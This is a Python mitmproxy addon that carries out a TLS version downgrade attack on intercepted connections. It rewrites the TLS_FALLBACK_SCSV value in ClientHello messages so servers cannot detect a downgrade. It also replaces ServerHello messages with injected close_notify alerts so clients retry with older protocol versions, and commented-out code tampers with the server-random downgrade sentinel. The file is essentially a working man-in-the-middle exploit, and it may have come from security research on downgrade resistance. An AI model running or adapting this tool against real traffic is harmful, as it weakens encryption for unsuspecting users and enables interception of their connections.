from mitmproxy import ctx
from mitmproxy import tcp, http, tls
import mitmproxy
from collections import defaultdict
from mitmproxy import command, flow
from typing import Sequence
from client_hello import parseHello, parseExtensions, parseSupportedVersion, parseServerHello



ver = lambda x: x[0]*0x100 + x[1]
            
class Downgrade_TCP:
    def __init__(self):
        self.dict = defaultdict(list)
        self.to_downgrade = defaultdict(int)
        self.view = ctx.master.addons.get("view")
        
    def tcp_message(self, flow: tcp.TCPFlow):
        msg = flow.messages[-1] # latest message
        host_name = flow.server_conn.peername # ip, port

        if msg.content[0] == 0x16 and msg.content[5] == 0x01:
            # client hello
            ext, ciphers, (cipher_loc, cipher_len) = parseHello(msg.content)
            client_ver = msg.content[9:11]

            for t, body in parseExtensions(ext):
                # Supported version extensions, only exist in tls1.3
                if ver(t) == 43: 
                    client_ver = b'\x03\x04'
                    vers = list(parseSupportedVersion(body))
                    ctx.log.warn(f"supported TLS versions = {vers}") 
                if ver(t) == 0: 
                # server name indication
                    ctx.log.warn(f"domain: {body}")
            ctx.log.warn(f"client uses {client_ver}")

            if host_name not in self.dict or ver(client_ver) >= ver(b'\x03\x01'): #sslv3
            # min(ver(v) for v in self.dict[host_name]):
            #ver(b'\x03\x03'):
            # if host_name not in self.dict or ver(client_ver) >= ver(b'\x03\x01') or ver(client_ver) == ver(b'\x01\x01'):
            # min(ver(v) for v in self.dict[host_name]):
            #if host_name not in self.dict or ver(client_ver) >= min(ver(v) for v in self.dict[host_name]):
                 #ver(b'\x03\x04'):#
                # lower than previous versions
                # send close_notify in server hello
                self.to_downgrade[host_name] += 1
                ctx.log.warn(self.to_downgrade[host_name])
                # flow.kill()
            else:
                # downgrade
                flow.marked = ":smiling_imp:"
            self.dict[host_name].append(client_ver)
            
            # check if fallback exists
            have_fallback = b'\x56\x00' in [ciphers[2*i:2*i+2] for i in range(len(ciphers)>>1)]
            fallback_scsv = "🟢" if have_fallback  else "🔴"
            # change the fallback_scsv
            if have_fallback:
                fallback_location = msg.content.find(b'\x56\x00', cipher_loc, cipher_loc+cipher_len)
                ctx.log.warn("".join("%02x" % x for x in msg.content[cipher_loc:cipher_loc+cipher_len]))
                client_hello = bytearray(msg.content)
                client_hello[fallback_location:fallback_location+2] = b'\x00\x19'
                msg.content = bytes(client_hello)
                flow.marked = ":middle_finger:"
                ctx.log.warn("changed scsv to other shit")
                ctx.log.warn("".join("%02x" % x for x in msg.content[cipher_loc:cipher_loc+cipher_len]))

            ctx.log.warn(f"{host_name}, {fallback_scsv}, TLS version = {self.dict[host_name]}")

        elif msg.content[0] == 0x16 and msg.content[5] == 0x02: 
            # 0x02: server hello
            # check for the server random
            server13 = False
            ext = parseServerHello(msg.content)
            server_ver = msg.content[9:11]
            if self.to_downgrade[host_name] > 0:
                flow.marked = ":knife:"
                msg.content = b'\x15\x03\x01\x00\x02\x01\x00' # close notify
                self.to_downgrade[host_name] -= 1
                ctx.log.warn(self.to_downgrade[host_name])
            # else:
            #     for t, body in parseExtensions(ext):
            #         if ver(t) == 43: # 1.3 server
            #             server13 = True
            #             server_ver = b'\x03\x04'
                        
            #             flow.marked = ":knife:"
            #     if server13 == False:
            #         if server_ver == b'\x03\x03': # 1.2 server
            #             if b'\x44\x4F\x57\x4E\x47\x52\x44\x01' not in msg.content:
            #                 ctx.log.warn("add 4401")
            #             server_hello = bytearray(msg.content)
            #             server_hello[35:43] = b'\x44\x4F\x57\x4E\x47\x52\x44\x01'
            #             msg.content = bytes(server_hello)
            #         else: # use 1.1 or below
            #             if b'\x44\x4F\x57\x4E\x47\x52\x44\x00' not in msg.content:
            #                 ctx.log.warn("add 4400")
            #             server_hello = bytearray(msg.content)
            #             server_hello[35:43] = b'\x44\x4F\x57\x4E\x47\x52\x44\x00'
            #             msg.content = bytes(server_hello)    
                        # close tcp
            ctx.log.warn(f"server uses {server_ver}")
        elif msg.content[0] == 0x15 and not msg.from_client: # alert from server.
            # if we should be killing the server hello, but an alert is shown, then
            # just treat it as we have killed the server hello.
            if self.to_downgrade[host_name] > 0:
                self.to_downgrade[host_name] -= 1
            
            


    @command.command('reset_downgrade')
    def reset_downgrade(self) -> None:
        self.dict.clear()
        self.view.clear()
        ctx.log.warn('reset downgrade done')

addons = [Downgrade_TCP()]
# addons = [Downgrade()]

